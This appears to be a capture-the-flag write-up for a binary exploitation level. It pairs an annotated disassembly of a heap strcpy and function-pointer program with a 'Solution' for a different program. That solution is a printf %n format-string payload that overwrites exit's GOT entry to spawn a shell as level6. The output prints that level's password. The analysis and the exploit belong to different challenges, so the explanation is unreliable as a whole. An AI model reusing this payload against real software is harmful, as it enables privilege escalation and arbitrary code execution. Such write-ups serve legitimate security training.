
#### notes
```
8048454  n    : fn : called in n
8048468  m    : fn : called in main
804847c  main : rak 3arf
```

#### 0x0804847c: main() : disassembly
_`<0> → <+6> : prepare stack frame for n function with size 32`_
```c
0x0804847c <+0>:	push   ebp
0x0804847d <+1>:	mov    ebp,esp
0x0804847f <+3>:	and    esp,0xfffffff0 // stack align
0x08048482 <+6>:	sub    esp,0x20 // 32
```
_`<+9> → <+21> : ...`_
```c
0x08048485 <+9>:	mov    DWORD PTR [esp],0x40 // *esp = 64
0x0804848c <+16>:	call   0x8048350 <malloc@plt> // eax = malloc(64)
0x08048491 <+21>:	mov    DWORD PTR [esp+0x1c],eax // esp+28 = eax
```
_`<+25> → <+37> : ...`_
```c
0x08048495 <+25>:	mov    DWORD PTR [esp],0x4 // *esp = 4
0x0804849c <+32>:	call   0x8048350 <malloc@plt> // eax = malloc(4)
0x080484a1 <+37>:	mov    DWORD PTR [esp+0x18],eax //  *esp+24 = eax
```
_`<+41> → <+50> : ...`_
```c
0x080484a5 <+41>:	mov    edx,0x8048468 // eax = &m address
0x080484aa <+46>:	mov    eax,DWORD PTR [esp+0x18] // eax = *esp+0x18 (address of malloc(4))
0x080484ae <+50>:	mov    DWORD PTR [eax],edx // *eax = &m (m() address)
```
_`<+52> → <+58> : ...`_
```c
0x080484b0 <+52>:	mov    eax,DWORD PTR [ebp+0xc] // eax = argv
0x080484b3 <+55>:	add    eax,0x4 // eax = eax + 4 = argv+1 = argv[1]
0x080484b6 <+58>:	mov    eax,DWORD PTR [eax] //eax = *argv[1] (value of argv[1])
```
_`<+60> → <+73> : ...`_
```c
0x080484b8 <+60>:	mov    edx,eax // edx = eax = argv[1]
0x080484ba <+62>:	mov    eax,DWORD PTR [esp+0x1c] // eax = return of malloc(64) the address in the hype
0x080484be <+66>:	mov    DWORD PTR [esp+0x4],edx // store edx respectivly at the first line in the stack
0x080484c2 <+70>:	mov    DWORD PTR [esp],eax // store eax in top of stack preparing the args for strcpy
0x080484c5 <+73>:	call   0x8048340 <strcpy@plt> // strcpy(eax, edx) <=> strcpy(malloc(64), argv[1])
```
_`<+78> → <+84> : get the address stored in address return by malloc(4) and call it , which is (m) function`_
```c
// const m2 = malloc(2)
0x080484ca <+78>:	mov    eax,DWORD PTR [esp+0x18]//eax = &m2
0x080484ce <+82>:	mov    eax,DWORD PTR [eax] =  eax = *eax = &m
0x080484d0 <+84>:	call   eax // (**eax)() call the address in eax as function eax() in other word : m()
```
_`<+86> → <+87> : quit the main function `_
```c
0x080484d2 <+86>:	leave
0x080484d3 <+87>:	ret
```
 
#### stack illustration
```
                high addresse
            +---------------------+
            :         argv        :
EBP+12  ->  +---------------------+
            :         argc        :
EBP+8   ->  +---------------------+
            :          eip        :
EBP+4   ->  +---------------------+
            :          ebp        :
EBP     ->  +---------------------+ -------\
            :      extra space    :        |
            :  stack alignement   :        |
ESP+28  ->  +---------------------+        |
            : malloc(64)  return  :        |
ESP+24  ->  +---------------------+        |   
            : malloc(4)   return  :        |
            +---------------------+        |  
                      .                    |
                      .                    | 32 bytes
                      .                    |
                      .                    |
                      .                    |
            +---------------------+        |
            :        argv[1]      :        |
ESP+4   ->  +---------------------+        |
            : malloc(64)  return  :        |
ESP         +---------------------+ -------/
                low address
``` 
---
#### Solution :
---

##### explanation of he exploit:

since the function `o` that calls the shell is not called in `n` function nor the main
so the idea here is : find a a vulnerability to call `o` from `n`
instead of exit the `n` we have to redirect it to execute the `o`
__how we will do that ?__ : 
- we have to overwrite the address where `<_exit@plt>` jumps (___global offset table___ __GOT__, search about it), to the address of `o` (_0x080484a4_)
ok lets start the process:

looking at the assembly of exit function inside the n function
```
(gdb) disass 0x80483d0
Dump of assembler code for function exit@plt:
0x080483d0 <+0>:	jmp    DWORD PTR ds:0x8049838
0x080483d6 <+6>:	push   0x28
0x080483db <+11>:	jmp    0x8048370
End of assembler dump.
(gdb)
```
the exit function jumps into `0x8049838` 
we have to change the value the value of this address by the address of `o` →`0x080484a4`
since we have only printf as a door to the exploit we will have to use the `%n` methode to write address into address
___what ?___
yes , simply we convert the address we want to change with to decimal 
in our case:
```
exit → 0x8049838
o    → 0x080484a4(hex) → 134513828(decimal)
```

final exploit : 
```shell
(python -c 'print "\x08\x04\x98\x38"[::-1] + "%134513824d" + "%4$n"'; cat -) | ./level5

whoami
level6
pwd
/home/user/level5
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
